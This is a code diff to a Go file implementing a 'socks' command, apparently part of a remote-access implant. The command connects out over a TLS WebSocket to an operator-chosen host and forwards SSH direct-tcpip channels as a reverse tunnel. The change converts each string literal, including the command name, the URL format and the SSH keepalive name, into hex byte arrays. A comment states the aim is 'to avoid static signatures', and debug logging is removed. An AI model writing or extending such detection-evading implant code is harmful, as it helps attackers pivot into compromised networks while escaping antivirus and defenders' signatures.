@@ -21,6 +21,29 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
+// SOCKS strings (constructed to avoid static signatures)
+var (
+	// Command name
+	socksCmdName = string([]byte{0x73, 0x6f, 0x63, 0x6b, 0x73}) // socks
+
+	// Action values
+	socksActionStart = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74}) // start
+	socksActionStop  = string([]byte{0x73, 0x74, 0x6f, 0x70})       // stop
+
+	// WebSocket URL format
+	socksWSSFmt = string([]byte{0x77, 0x73, 0x73, 0x3a, 0x2f, 0x2f, 0x25, 0x73, 0x3a, 0x25, 0x64, 0x25, 0x73}) // wss://%s:%d%s
+
+	// SSH keepalive string (fingerprint)
+	socksKeepalive = string([]byte{0x6b, 0x65, 0x65, 0x70, 0x61, 0x6c, 0x69, 0x76, 0x65, 0x40, 0x67, 0x6f, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x6f, 0x72, 0x67}) // keepalive@golang.org
+
+	// SSH channel type
+	socksDirectTCP = string([]byte{0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x2d, 0x74, 0x63, 0x70, 0x69, 0x70}) // direct-tcpip
+
+	// Error/reject messages
+	socksUnknownChan = string([]byte{0x75, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e, 0x20, 0x63, 0x68, 0x61, 0x6e, 0x6e, 0x65, 0x6c, 0x20, 0x74, 0x79, 0x70, 0x65})                         // unknown channel type
+	socksConnLimit   = string([]byte{0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x6c, 0x69, 0x6d, 0x69, 0x74, 0x20, 0x72, 0x65, 0x61, 0x63, 0x68, 0x65, 0x64}) // connection limit reached
+)
+
 type SocksCommand struct {
 	wsConn          *websocket.Conn
 	sshClient       *ssh.Client
@@ -43,7 +66,7 @@ type TunnelInfo struct {
 }
 
 func (c *SocksCommand) Name() string {
-	return "socks"
+	return socksCmdName
 }
 
 func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -96,7 +119,7 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	// 	socksData.Action, socksData.WSSHost, socksData.WSSPort, socksData.Path)
 
 	switch socksData.Action {
-	case "start":
+	case socksActionStart:
 		// removed debug log
 
 		// Configure dialer with TLS settings
@@ -109,7 +132,7 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		}
 
 		// Build WebSocket URL
-		wsURL := fmt.Sprintf("wss://%s:%d%s",
+		wsURL := fmt.Sprintf(socksWSSFmt,
 			socksData.WSSHost,
 			socksData.WSSPort,
 			socksData.Path,
@@ -206,7 +229,7 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 
-	case "stop":
+	case socksActionStop:
 		// removed debug log
 
 		c.mu.Lock()
@@ -254,7 +277,7 @@ func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
 		time.Sleep(keepaliveInterval)
 
 		// Send keepalive request
-		_, _, err := sshConn.SendRequest("keepalive@golang.org", true, nil)
+		_, _, err := sshConn.SendRequest(socksKeepalive, true, nil)
 		if err != nil {
 			// removed debug log
 			// Trigger cleanup on connection failure
@@ -354,9 +377,9 @@ func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
 func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	// removed debug log
 
-	if newChannel.ChannelType() != "direct-tcpip" {
+	if newChannel.ChannelType() != socksDirectTCP {
 		// removed debug log
-		newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
+		newChannel.Reject(ssh.UnknownChannelType, socksUnknownChan)
 		return
 	}
 
@@ -365,7 +388,7 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	if c.currentConns >= c.maxConnections {
 		c.mu.Unlock()
 		// removed debug log
-		newChannel.Reject(ssh.ResourceShortage, "connection limit reached")
+		newChannel.Reject(ssh.ResourceShortage, socksConnLimit)
 		return
 	}
 	c.currentConns++
